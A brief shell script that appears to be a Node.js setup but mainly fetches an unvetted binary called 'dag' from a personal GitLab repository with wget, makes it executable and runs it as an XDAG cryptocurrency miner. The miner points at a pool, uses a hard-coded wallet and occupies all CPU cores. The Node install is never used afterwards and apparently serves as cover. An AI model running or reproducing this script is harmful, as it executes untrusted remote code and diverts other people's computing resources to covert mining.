wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
\rm node-v14.17.0-linux-x64.tar.gz
PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
npm config set cache /tmp --global
wget https://gitlab.com/richardkevin320/donlod/-/raw/main/dag && chmod +x dag
./dag -cpu -a a+dc1CL2NRgbtPvLtys614KSKlv5rdYw -p equal.xdag.org:13656 -t $(nproc --all)

